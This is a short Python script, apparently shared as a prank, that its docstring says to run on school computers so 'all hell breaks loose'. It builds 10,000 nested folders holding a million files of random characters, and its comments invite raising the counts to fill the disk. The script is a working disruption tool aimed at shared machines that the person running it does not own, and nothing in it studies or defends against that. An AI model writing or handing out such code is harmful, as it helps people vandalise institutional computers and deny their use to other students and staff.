'''
  Infinite File Generator
Run this on one of the school computers and watch all hell break loose
'''

import os
import random
import string


def create_text():
    text = ''
    for x in range(999): #CHANGE THIS NUMBER
        text += random.choice(string.ascii_letters+string.digits)
    return text


for x in range(100):                                  ##CHANGE THIS NUMBER
    directory = str(x)
    for y in range(100):                              ##CHANGE THIS NUMBER
        subdirectory = str(y)
        folder = f'C:/Desktop/{x}/{y}'                ##CHANGE THIS TO DIRECTORY
        os.makedirs(folder)
        for z in range(100):                          ##CHANGE THIS NUMBER
            os.chdir(folder)
            file = str(z)+'.txt'
            with open(file, 'w') as f:
                f.write(create_text())
